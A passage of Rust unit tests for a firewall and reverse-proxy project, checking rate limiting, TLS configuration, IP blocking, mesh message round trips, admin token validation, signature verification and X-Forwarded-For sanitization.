    use synvoid::waf::ratelimit::core::{IpRateLimitConfig, SlottedIpRateLimiter};

    #[test]
    fn test_slotted_ip_rate_limiter_ip_rate_limiter_trait() {
        let config = IpRateLimitConfig {
            per_second: 100,
            per_minute: 1000,
            per_5min: 5000,
            per_10min: 8000,
            per_hour: 10000,
            per_day: 20000,
        };
        let limiter = SlottedIpRateLimiter::new(config);

        let ip: std::net::IpAddr = "192.168.1.1".parse().unwrap();

        let result = IpRateLimiter::check(&limiter, ip);
        assert!(matches!(result, RateLimitResult::Allowed));
    }

    #[test]
    fn test_slotted_ip_rate_limiter_stats_provider() {
        let config = IpRateLimitConfig::default();
        let limiter = SlottedIpRateLimiter::new(config);

        let stats = limiter.get_stats();
        assert!(stats.is_some());

        let stats = stats.unwrap();
        assert_eq!(stats.limit, 10);
    }

    #[test]
    fn test_rate_limit_result_variants() {
        let allowed = RateLimitResult::Allowed;
        assert!(matches!(allowed, RateLimitResult::Allowed));

        let limited = RateLimitResult::Limited {
            retry_after_secs: 60,
        };
        assert!(matches!(
            limited,
            RateLimitResult::Limited {
                retry_after_secs: 60
            }
        ));
    }
}

#[cfg(test)]
mod tls_config_tests {
    use std::path::PathBuf;

    #[test]
    fn test_tls_config_default() {
        use synvoid::tls::config::InternalTlsConfig;

        let config = InternalTlsConfig::default();

        assert!(!config.enabled);
        assert!(config.prefer_post_quantum);
        assert!(config.tls_1_3_only);
        assert!(!config.enable_tls_12_fallback);
        assert!(config.ocsp_stapling_enabled);
        assert_eq!(config.port, 443);
        assert!(!config.acme.enabled);
        assert!(!config.client_auth.enabled);
    }

    #[test]
    fn test_acme_config_default() {
        use synvoid::tls::config::InternalAcmeConfig;

        let config = InternalAcmeConfig::default();

        assert!(!config.enabled);
        assert!(config.email.is_none());
        assert!(config.cache_dir.is_none());
        assert!(!config.staging);
        assert!(config.domains.is_empty());
    }

    #[test]
    fn test_client_auth_config_default() {
        use synvoid::tls::config::InternalClientAuthConfig;

        let config = InternalClientAuthConfig::default();

        assert!(!config.enabled);
        assert!(config.ca_cert_path.is_none());
    }

    #[test]
    fn test_tls_config_with_values() {
        use synvoid::tls::config::{
            InternalAcmeChallengeType, InternalAcmeConfig, InternalClientAuthConfig,
            InternalTlsConfig,
        };

        let config = InternalTlsConfig {
            enabled: true,
            cert_path: Some(PathBuf::from("/etc/ssl/cert.pem")),
            key_path: Some(PathBuf::from("/etc/ssl/key.pem")),
            watch_dir: Some(PathBuf::from("/etc/ssl")),
            prefer_post_quantum: false,
            tls_1_3_only: false,
            enable_tls_12_fallback: true,
            ocsp_stapling_enabled: false,
            ocsp_response_path: Some(PathBuf::from("/etc/ssl/ocsp.der")),
            port: 8443,
            acme: InternalAcmeConfig {
                enabled: true,
                email: Some("admin@example.com".to_string()),
                cache_dir: Some(PathBuf::from("/var/lib/acme")),
                staging: true,
                domains: vec!["example.com".to_string(), "www.example.com".to_string()],
                challenge_type: InternalAcmeChallengeType::Http01,
                terms_of_service_agreed: false,
            },
            client_auth: InternalClientAuthConfig {
                enabled: true,
                ca_cert_path: Some(PathBuf::from("/etc/ssl/ca.pem")),
            },
        };

        assert!(config.enabled);
        assert_eq!(config.port, 8443);
        assert!(config.enable_tls_12_fallback);
        assert!(!config.tls_1_3_only);
        assert!(config.acme.enabled);
        assert_eq!(config.acme.domains.len(), 2);
        assert!(config.client_auth.enabled);
    }
}

#[cfg(test)]
mod block_store_tests {
    use std::net::IpAddr;
    use synvoid::block_store::{BlockEntry, BlockStore, BlockStoreStats};
    use synvoid::config::DenyListLimitsConfig;
    use tempfile::TempDir;

    fn default_config() -> DenyListLimitsConfig {
        DenyListLimitsConfig {
            max_entries: 1000,
            persist_interval_secs: 0,
            target_state_persist: false,
            ..DenyListLimitsConfig::default()
        }
    }

    #[tokio::test]
    async fn test_block_store_stats_calculation() {
        let temp_dir = TempDir::new().unwrap();
        let store = BlockStore::new(true, Some(temp_dir.path().to_path_buf()), default_config());

        store.block_ip("10.0.0.1".parse().unwrap(), "permanent", 0, "global");
        store.block_ip("10.0.0.2".parse().unwrap(), "temp", 3600, "global");

        let stats = store.get_stats();

        assert_eq!(stats.total_entries, 2);
        assert_eq!(stats.permanent_count, 1);
        assert!(stats.utilization_percent >= 0.0);
    }

    #[test]
    fn test_block_entry_key_format() {
        let ip: IpAddr = "192.168.1.1".parse().unwrap();
        let key = BlockEntry::key("global", &ip);

        assert!(key.starts_with("block:"));
        assert!(key.contains("global"));
        assert!(key.contains("192.168.1.1"));
    }

    #[test]
    fn test_block_entry_permanent_detection() {
        let ip: IpAddr = "127.0.0.1".parse().unwrap();

        let permanent = BlockEntry::new(ip, "test".to_string(), 0, "global".to_string());
        assert!(permanent.is_permanent());

        let temporary = BlockEntry::new(ip, "test".to_string(), 3600, "global".to_string());
        assert!(!temporary.is_permanent());
    }

    #[test]
    fn test_block_store_stats_default() {
        let stats = BlockStoreStats {
            total_entries: 0,
            max_entries: 1000,
            permanent_count: 0,
            expired_count: 0,
            utilization_percent: 0.0,
        };

        assert_eq!(stats.total_entries, 0);
        assert_eq!(stats.max_entries, 1000);
        assert_eq!(stats.utilization_percent, 0.0);
    }
}

#[cfg(test)]
mod mesh_protocol_roundtrip_tests {
    use synvoid::mesh::protocol::{AckStatus, HealthStatus, LookupType, MeshMessage};

    fn roundtrip(msg: &MeshMessage) -> MeshMessage {
        let encoded = msg.encode().expect("encode failed");
        MeshMessage::decode(&encoded).expect("decode failed")
    }

    fn roundtrip_with_length(msg: &MeshMessage) -> MeshMessage {
        let encoded = msg.encode_with_length().expect("encode_with_length failed");
        // Skip 4-byte length prefix
        MeshMessage::decode(&encoded[4..]).expect("decode failed")
    }

    #[test]
    fn test_keepalive_roundtrip() {
        let msg = MeshMessage::KeepAlive;
        let decoded = roundtrip(&msg);
        assert!(matches!(decoded, MeshMessage::KeepAlive));
    }

    #[test]
    fn test_keepalive_ack_roundtrip() {
        let msg = MeshMessage::KeepAliveAck;
        let decoded = roundtrip(&msg);
        assert!(matches!(decoded, MeshMessage::KeepAliveAck));
    }

    #[test]
    fn test_sync_request_roundtrip() {
        let msg = MeshMessage::SyncRequest {
            node_id: "node-123".into(),
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::SyncRequest { node_id } => {
                assert_eq!(node_id.as_str(), "node-123");
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_ping_roundtrip() {
        let msg = MeshMessage::Ping {
            request_id: "req-456".into(),
            node_id: "node-789".into(),
            timestamp: 1234567890,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::Ping {
                request_id,
                node_id,
                timestamp,
            } => {
                assert_eq!(request_id.as_str(), "req-456");
                assert_eq!(node_id.as_str(), "node-789");
                assert_eq!(timestamp, 1234567890);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_pong_roundtrip() {
        let msg = MeshMessage::Pong {
            request_id: "req-abc".into(),
            node_id: "node-def".into(),
            timestamp: 9876543210,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::Pong {
                request_id,
                node_id,
                timestamp,
            } => {
                assert_eq!(request_id.as_str(), "req-abc");
                assert_eq!(node_id.as_str(), "node-def");
                assert_eq!(timestamp, 9876543210);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_lookup_request_roundtrip() {
        let msg = MeshMessage::LookupRequest {
            request_id: "lr-1".into(),
            key: "dns:example.com".into(),
            lookup_type: LookupType::KeyValue,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::LookupRequest {
                request_id,
                key,
                lookup_type,
            } => {
                assert_eq!(request_id.as_str(), "lr-1");
                assert_eq!(key.as_str(), "dns:example.com");
                assert_eq!(lookup_type, LookupType::KeyValue);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_lookup_response_found_roundtrip() {
        let msg = MeshMessage::LookupResponse {
            request_id: "lr-1".into(),
            key: "dns:example.com".into(),
            value: Some(b"192.168.1.1".to_vec()),
            found: true,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::LookupResponse {
                request_id,
                key,
                value,
                found,
            } => {
                assert_eq!(request_id.as_str(), "lr-1");
                assert_eq!(key.as_str(), "dns:example.com");
                assert_eq!(value, Some(b"192.168.1.1".to_vec()));
                assert!(found);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_lookup_response_not_found_roundtrip() {
        let msg = MeshMessage::LookupResponse {
            request_id: "lr-2".into(),
            key: "dns:missing.com".into(),
            value: None,
            found: false,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::LookupResponse { value, found, .. } => {
                assert_eq!(value, None);
                assert!(!found);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_peer_health_check_roundtrip() {
        let msg = MeshMessage::PeerHealthCheck {
            peer_id: "peer-1".into(),
            timestamp: 1000000,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::PeerHealthCheck { peer_id, timestamp } => {
                assert_eq!(peer_id.as_str(), "peer-1");
                assert_eq!(timestamp, 1000000);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_peer_health_response_roundtrip() {
        let msg = MeshMessage::PeerHealthResponse {
            peer_id: "peer-1".into(),
            status: HealthStatus::Healthy,
            latency_ms: Some(42),
            timestamp: 1000000,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::PeerHealthResponse {
                peer_id,
                status,
                latency_ms,
                timestamp,
            } => {
                assert_eq!(peer_id.as_str(), "peer-1");
                assert_eq!(status, HealthStatus::Healthy);
                assert_eq!(latency_ms, Some(42));
                assert_eq!(timestamp, 1000000);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_error_roundtrip() {
        let msg = MeshMessage::Error {
            code: 404,
            message: "not found".into(),
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::Error { code, message } => {
                assert_eq!(code, 404);
                assert_eq!(message.as_str(), "not found");
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_mesh_ack_roundtrip() {
        let msg = MeshMessage::MeshAck {
            original_message_id: "msg-123".into(),
            status: AckStatus::Success,
            timestamp: 9999,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::MeshAck {
                original_message_id,
                status,
                timestamp,
            } => {
                assert_eq!(original_message_id.as_str(), "msg-123");
                assert_eq!(status, AckStatus::Success);
                assert_eq!(timestamp, 9999);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_lookup_batch_request_roundtrip() {
        let keys = vec!["key1".into(), "key2".into(), "key3".into()];
        let msg = MeshMessage::LookupBatchRequest {
            request_id: "batch-1".into(),
            keys: keys.clone(),
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::LookupBatchRequest {
                request_id,
                keys: k,
            } => {
                assert_eq!(request_id.as_str(), "batch-1");
                assert_eq!(k.len(), 3);
                assert_eq!(k[0].as_str(), "key1");
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_length_prefix_roundtrip() {
        let msg = MeshMessage::Ping {
            request_id: "lp-test".into(),
            node_id: "node-lp".into(),
            timestamp: 42,
        };
        let decoded = roundtrip_with_length(&msg);
        match decoded {
            MeshMessage::Ping {
                request_id,
                node_id,
                timestamp,
            } => {
                assert_eq!(request_id.as_str(), "lp-test");
                assert_eq!(node_id.as_str(), "node-lp");
                assert_eq!(timestamp, 42);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_roundtrip_preserves_binary_data() {
        let binary_data: Vec<u8> = (0..255).collect();
        let msg = MeshMessage::LookupResponse {
            request_id: "bin-test".into(),
            key: "binary".into(),
            value: Some(binary_data.clone()),
            found: true,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::LookupResponse { value, .. } => {
                assert_eq!(value, Some(binary_data));
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_roundtrip_empty_strings() {
        let msg = MeshMessage::Ping {
            request_id: "".into(),
            node_id: "".into(),
            timestamp: 0,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            MeshMessage::Ping {
                request_id,
                node_id,
                timestamp,
            } => {
                assert_eq!(request_id.as_str(), "");
                assert_eq!(node_id.as_str(), "");
                assert_eq!(timestamp, 0);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn test_decode_invalid_data_returns_none() {
        assert!(MeshMessage::decode(&[]).is_none());
        assert!(MeshMessage::decode(&[0xFF, 0xFF, 0xFF]).is_none());
        assert!(MeshMessage::decode(b"not protobuf").is_none());
    }
}

#[cfg(test)]
mod ipc_serialization_tests {
    use synvoid::process::{ErrorCode, ErrorSeverity, Message, WorkerId};

    fn roundtrip(msg: &Message) -> Message {
        let json = serde_json::to_string(msg).expect("serialize");
        serde_json::from_str(&json).expect("deserialize")
    }

    #[test]
    fn worker_started_roundtrip() {
        let msg = Message::WorkerStarted {
            id: WorkerId(3),
            pid: 9999,
            port: 8443,
            timestamp: 1700000000,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::WorkerStarted {
                id,
                pid,
                port,
                timestamp,
            } => {
                assert_eq!(id, WorkerId(3));
                assert_eq!(pid, 9999);
                assert_eq!(port, 8443);
                assert_eq!(timestamp, 1700000000);
            }
            _ => panic!("wrong variant after roundtrip"),
        }
    }

    #[test]
    fn worker_ready_roundtrip() {
        let msg = Message::WorkerReady { id: WorkerId(7) };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::WorkerReady { id } => assert_eq!(id, WorkerId(7)),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn worker_error_roundtrip() {
        let msg = Message::WorkerError {
            id: WorkerId(1),
            error: "disk full".to_string(),
            severity: ErrorSeverity::Critical,
            error_code: ErrorCode::ResourceExhausted,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::WorkerError {
                id,
                error,
                severity,
                error_code,
            } => {
                assert_eq!(id, WorkerId(1));
                assert_eq!(error, "disk full");
                assert_eq!(severity, ErrorSeverity::Critical);
                assert_eq!(error_code, ErrorCode::ResourceExhausted);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn master_shutdown_roundtrip() {
        let msg = Message::MasterShutdown {
            graceful: true,
            timeout_secs: 30,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::MasterShutdown {
                graceful,
                timeout_secs,
            } => {
                assert!(graceful);
                assert_eq!(timeout_secs, 30);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn master_config_reload_roundtrip() {
        let msg = Message::MasterConfigReload {
            config_path: "/etc/synvoid/main.toml".to_string(),
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::MasterConfigReload { config_path } => {
                assert_eq!(config_path, "/etc/synvoid/main.toml");
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn health_check_ack_roundtrip() {
        let msg = Message::HealthCheckAck {
            timestamp: 1234567890,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::HealthCheckAck { timestamp } => assert_eq!(timestamp, 1234567890),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn worker_drain_roundtrip() {
        let msg = Message::WorkerDrain {
            id: WorkerId(2),
            timeout_secs: 60,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::WorkerDrain { id, timeout_secs } => {
                assert_eq!(id, WorkerId(2));
                assert_eq!(timeout_secs, 60);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn drain_request_roundtrip() {
        let msg = Message::DrainRequest {
            timeout_secs: 45,
            drain_id: 42,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::DrainRequest {
                timeout_secs,
                drain_id,
            } => {
                assert_eq!(timeout_secs, 45);
                assert_eq!(drain_id, 42);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn restore_from_drain_roundtrip() {
        let msg = Message::RestoreFromDrain;
        let decoded = roundtrip(&msg);
        assert!(matches!(decoded, Message::RestoreFromDrain));
    }

    #[test]
    fn overseer_get_status_roundtrip() {
        let msg = Message::SupervisorGetStatus;
        let decoded = roundtrip(&msg);
        assert!(matches!(decoded, Message::SupervisorGetStatus));
    }

    #[test]
    fn minify_error_roundtrip() {
        let msg = Message::MinifyError {
            request_id: 555,
            error: "syntax error in CSS".to_string(),
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::MinifyError { request_id, error } => {
                assert_eq!(request_id, 555);
                assert_eq!(error, "syntax error in CSS");
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn restart_worker_request_roundtrip() {
        let msg = Message::RestartWorkerRequest { id: WorkerId(0) };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::RestartWorkerRequest { id } => assert_eq!(id, WorkerId(0)),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn worker_connection_count_roundtrip() {
        let msg = Message::WorkerConnectionCount {
            id: WorkerId(5),
            active: 100,
            idle: 20,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::WorkerConnectionCount { id, active, idle } => {
                assert_eq!(id, WorkerId(5));
                assert_eq!(active, 100);
                assert_eq!(idle, 20);
            }
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn socket_handoff_complete_roundtrip() {
        let msg = Message::SocketHandoffComplete {
            success: true,
            fd_count: 4,
        };
        let decoded = roundtrip(&msg);
        match decoded {
            Message::SocketHandoffComplete { success, fd_count } => {
                assert!(success);
                assert_eq!(fd_count, 4);
            }
            _ => panic!("wrong variant"),
        }
    }

    // ── Admin config validation tests ────────────────────────────────

    mod admin_config_tests {
        use synvoid::config::admin::{AdminConfig, AdminCorsConfig, AdminRateLimitConfig};

        #[test]
        fn test_admin_config_valid() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "xR4kT9mW2pQ7vN3jL5hB8cF1gA6eD0yZ".to_string(),
                token_env_var: None,
                bcrypt_cost: 12,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            assert!(config.validate().is_ok());
        }

        #[test]
        fn test_admin_config_port_zero_rejected() {
            let config = AdminConfig {
                enabled: true,
                port: 0,
                bind_address: "127.0.0.1".to_string(),
                token: "xR4kT9mW2pQ7vN3jL5hB8cF1gA6eD0yZ".to_string(),
                token_env_var: None,
                bcrypt_cost: 12,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let err = config.validate().unwrap_err();
            assert_eq!(err.field, "admin.port");
        }

        #[test]
        fn test_admin_config_bcrypt_cost_too_low() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "xR4kT9mW2pQ7vN3jL5hB8cF1gA6eD0yZ".to_string(),
                token_env_var: None,
                bcrypt_cost: 4,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let err = config.validate().unwrap_err();
            assert_eq!(err.field, "admin.bcrypt_cost");
        }

        #[test]
        fn test_admin_config_bcrypt_cost_too_high() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "xR4kT9mW2pQ7vN3jL5hB8cF1gA6eD0yZ".to_string(),
                token_env_var: None,
                bcrypt_cost: 20,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let err = config.validate().unwrap_err();
            assert_eq!(err.field, "admin.bcrypt_cost");
        }

        #[test]
        fn test_admin_config_weak_token_rejected() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "password1234567890abcdefghijklmnopqrstuvwxyz".to_string(),
                token_env_var: None,
                bcrypt_cost: 12,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let err = config.validate().unwrap_err();
            assert_eq!(err.field, "admin.token");
            assert!(
                err.message.contains("weak pattern"),
                "Expected weak pattern error, got: {}",
                err.message
            );
        }

        #[test]
        fn test_admin_config_short_token_rejected() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "short".to_string(),
                token_env_var: None,
                bcrypt_cost: 12,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let err = config.validate().unwrap_err();
            assert!(err.message.contains("at least"));
        }

        #[test]
        fn test_admin_config_default_token_debug_only() {
            let config = AdminConfig {
                enabled: true,
                port: 8081,
                bind_address: "127.0.0.1".to_string(),
                token: "changeme".to_string(),
                token_env_var: None,
                bcrypt_cost: 12,
                cors: AdminCorsConfig::default(),
                rate_limit: AdminRateLimitConfig::default(),
                trusted_proxies: vec![],
            };
            let result = config.validate();
            assert!(result.is_err());
        }
    }
}

#[cfg(test)]
mod atomic_counter_safety_tests {
    use std::sync::atomic::{AtomicU64, Ordering};

    #[test]
    fn test_fetch_update_checked_sub_no_underflow() {
        let counter = AtomicU64::new(0);

        let result =
            counter.fetch_update(Ordering::Relaxed, Ordering::Relaxed, |v| v.checked_sub(1));

        assert!(result.is_err());
        assert_eq!(counter.load(Ordering::Relaxed), 0);
    }

    #[test]
    fn test_fetch_update_checked_sub_normal_decrement() {
        let counter = AtomicU64::new(5);

        let result =
            counter.fetch_update(Ordering::Relaxed, Ordering::Relaxed, |v| v.checked_sub(1));

        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 5);
        assert_eq!(counter.load(Ordering::Relaxed), 4);
    }

    #[test]
    fn test_fetch_update_checked_sub_exact_zero() {
        let counter = AtomicU64::new(1);

        let result =
            counter.fetch_update(Ordering::Relaxed, Ordering::Relaxed, |v| v.checked_sub(1));

        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 1);
        assert_eq!(counter.load(Ordering::Relaxed), 0);
    }

    #[test]
    fn test_fetch_update_checked_sub_multiple_decrements() {
        let counter = AtomicU64::new(10);

        for expected in (0..10).rev() {
            let result =
                counter.fetch_update(Ordering::Relaxed, Ordering::Relaxed, |v| v.checked_sub(1));
            assert!(result.is_ok());
            assert_eq!(result.unwrap(), expected + 1);
        }

        assert_eq!(counter.load(Ordering::Relaxed), 0);

        let result =
            counter.fetch_update(Ordering::Relaxed, Ordering::Relaxed, |v| v.checked_sub(1));
        assert!(result.is_err());
    }

    #[test]
    fn test_fetch_update_checked_sub_concurrent_pattern() {
        let counter = AtomicU64::new(100);

        let results: Vec<Option<u64>> = (0..100)
            .map(|_| {
                counter
                    .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |v| v.checked_sub(1))
                    .ok()
            })
            .collect();

        let successes = results.iter().filter_map(|r| *r).count();
        assert_eq!(successes, 100);
        assert_eq!(counter.load(Ordering::SeqCst), 0);

        let final_result =
            counter.fetch_update(Ordering::SeqCst, Ordering::SeqCst, |v| v.checked_sub(1));
        assert!(final_result.is_err());
    }
}

#[cfg(test)]
mod signature_verification_tests {
    use synvoid::mesh::cert::{sign_ed25519, sign_hmac, verify_ed25519, verify_hmac};

    #[test]
    fn test_verify_ed25519_valid_signature() {
        let private_key = [0xAA; 32];
        let public_key: [u8; 32] = {
            let mut pk = [0u8; 32];
            let mut key_array = [0u8; 32];
            key_array.copy_from_slice(&private_key);
            let signing_key = ed25519_dalek::SigningKey::from_bytes(&key_array);
            pk.copy_from_slice(signing_key.verifying_key().as_bytes());
            pk
        };

        let message = "test message for verification";
        let signature = sign_ed25519(message, &private_key).expect("signing failed");

        assert!(verify_ed25519(message, &signature, &public_key));
    }

    #[test]
    fn test_verify_ed25519_wrong_message() {
        let private_key = [0xAA; 32];
        let public_key: [u8; 32] = {
            let mut pk = [0u8; 32];
            let mut key_array = [0u8; 32];
            key_array.copy_from_slice(&private_key);
            let signing_key = ed25519_dalek::SigningKey::from_bytes(&key_array);
            pk.copy_from_slice(signing_key.verifying_key().as_bytes());
            pk
        };

        let signature = sign_ed25519("original message", &private_key).expect("signing failed");

        assert!(!verify_ed25519(
            "different message",
            &signature,
            &public_key
        ));
    }

    #[test]
    fn test_verify_ed25519_wrong_public_key() {
        let private_key = [0xAA; 32];
        let wrong_public_key = [0xBB; 32];

        let message = "test message";
        let signature = sign_ed25519(message, &private_key).expect("signing failed");

        assert!(!verify_ed25519(message, &signature, &wrong_public_key));
    }

    #[test]
    fn test_verify_ed25519_tampered_signature() {
        let private_key = [0xAA; 32];
        let public_key: [u8; 32] = {
            let mut pk = [0u8; 32];
            let mut key_array = [0u8; 32];
            key_array.copy_from_slice(&private_key);
            let signing_key = ed25519_dalek::SigningKey::from_bytes(&key_array);
            pk.copy_from_slice(signing_key.verifying_key().as_bytes());
            pk
        };

        let message = "test message";
        let mut signature = sign_ed25519(message, &private_key).expect("signing failed");
        signature[0] ^= 0xFF;

        assert!(!verify_ed25519(message, &signature, &public_key));
    }

    #[test]
    fn test_verify_ed25519_invalid_signature_length() {
        let public_key = [0xAA; 32];
        let short_signature = [0xBB; 32];
        let long_signature = [0xCC; 128];

        assert!(!verify_ed25519("message", &short_signature, &public_key));
        assert!(!verify_ed25519("message", &long_signature, &public_key));
    }

    #[test]
    fn test_verify_ed25519_invalid_public_key_length() {
        let signature = [0xAA; 64];
        let short_key = [0xBB; 16];
        let long_key = [0xCC; 64];

        assert!(!verify_ed25519("message", &signature, &short_key));
        assert!(!verify_ed25519("message", &signature, &long_key));
    }

    #[test]
    fn test_verify_hmac_valid() {
        let key = b"test-secret-key-12345";
        let message = "HMAC test message";
        let signature = sign_hmac(message, key).expect("sign_hmac failed");

        assert!(verify_hmac(message, &signature, key));
    }

    #[test]
    fn test_verify_hmac_wrong_message() {
        let key = b"test-secret-key-12345";
        let signature = sign_hmac("original", key).expect("sign_hmac failed");

        assert!(!verify_hmac("different", &signature, key));
    }

    #[test]
    fn test_verify_hmac_wrong_key() {
        let key1 = b"correct-key";
        let key2 = b"wrong-key";
        let message = "message";
        let signature = sign_hmac(message, key1).expect("sign_hmac failed");

        assert!(!verify_hmac(message, &signature, key2));
    }

    #[test]
    fn test_verify_hmac_empty_message() {
        let key = b"test-key";
        let message = "";
        let signature = sign_hmac(message, key).expect("sign_hmac failed");

        assert!(verify_hmac(message, &signature, key));
    }
}

#[cfg(test)]
mod xff_validation_tests {
    use synvoid::proxy::{validate_and_truncate_xff, MAX_XFF_CHAIN_LENGTH};

    #[test]
    fn test_validate_and_truncate_xff_empty() {
        let result = validate_and_truncate_xff("", "8.8.8.8");
        assert_eq!(result, "8.8.8.8");
    }

    #[test]
    fn test_validate_and_truncate_xff_single_valid() {
        let result = validate_and_truncate_xff("8.8.8.8", "1.1.1.1");
        assert_eq!(result, "8.8.8.8, 1.1.1.1");
    }

    #[test]
    fn test_validate_and_truncate_xff_multiple_valid() {
        let result = validate_and_truncate_xff("8.8.8.8, 1.1.1.1", "9.9.9.9");
        assert_eq!(result, "8.8.8.8, 1.1.1.1, 9.9.9.9");
    }

    #[test]
    fn test_validate_and_truncate_xff_invalid_ip_rejected() {
        let result = validate_and_truncate_xff("not-an-ip, 8.8.8.8", "1.1.1.1");
        assert_eq!(result, "8.8.8.8, 1.1.1.1");
    }

    #[test]
    fn test_validate_and_truncate_xff_ipv6_preserved() {
        let result = validate_and_truncate_xff("2001:4860:4860::8888", "8.8.8.8");
        assert_eq!(result, "2001:4860:4860::8888, 8.8.8.8");
    }

    #[test]
    fn test_validate_and_truncate_xff_chain_truncated() {
        let mut xff = String::new();
        for i in 0..15 {
            if i > 0 {
                xff.push_str(", ");
            }
            xff.push_str(&format!("8.8.8.{}", i % 256));
        }

        let result = validate_and_truncate_xff(&xff, "1.1.1.1");

        let entries: Vec<&str> = result.split(", ").collect();
        assert!(entries.len() <= MAX_XFF_CHAIN_LENGTH);
        assert!(result.ends_with("1.1.1.1"));
    }

    #[test]
    fn test_validate_and_truncate_xff_truncation_exact_limit() {
        let mut xff = String::new();
        for i in 0..9 {
            if i > 0 {
                xff.push_str(", ");
            }
            xff.push_str(&format!("8.8.8.{}", i + 1));
        }

        let result = validate_and_truncate_xff(&xff, "1.1.1.1");
        let entries: Vec<&str> = result.split(", ").collect();
        assert_eq!(entries.len(), MAX_XFF_CHAIN_LENGTH);
    }

    #[test]
    fn test_validate_and_truncate_xff_empty_entries_removed() {
        let result = validate_and_truncate_xff(", , 8.8.8.8, , ", "1.1.1.1");
        assert_eq!(result, "8.8.8.8, 1.1.1.1");
    }

    #[test]
    fn test_validate_and_truncate_xff_whitespace_trimmed() {
        let result = validate_and_truncate_xff("  8.8.8.8  ,  1.1.1.1  ", "9.9.9.9");
        assert_eq!(result, "8.8.8.8, 1.1.1.1, 9.9.9.9");
    }

    #[test]
    fn test_validate_and_truncate_xff_only_invalid_entries() {
        let result = validate_and_truncate_xff("invalid, not-ip, garbage", "8.8.8.8");
        assert_eq!(result, "8.8.8.8");
    }

    #[test]
    fn test_validate_and_truncate_xff_private_ip_rejected() {
        let result = validate_and_truncate_xff("10.0.0.1", "8.8.8.8");
        assert_eq!(result, "8.8.8.8");
    }

    #[test]
    fn test_validate_and_truncate_xff_private_ip_middle_rejected() {
        let result = validate_and_truncate_xff("8.8.8.8, 192.168.1.1, 1.1.1.1", "9.9.9.9");
        assert_eq!(result, "8.8.8.8, 1.1.1.1, 9.9.9.9");
    }

    #[test]
    fn test_validate_and_truncate_xff_loopback_rejected() {
        let result = validate_and_truncate_xff("::1", "8.8.8.8");
        assert_eq!(result, "8.8.8.8");
    }
}

#[cfg(test)]
mod hub_only_mode_tests {
    use synvoid::mesh::config::MeshNodeRole;
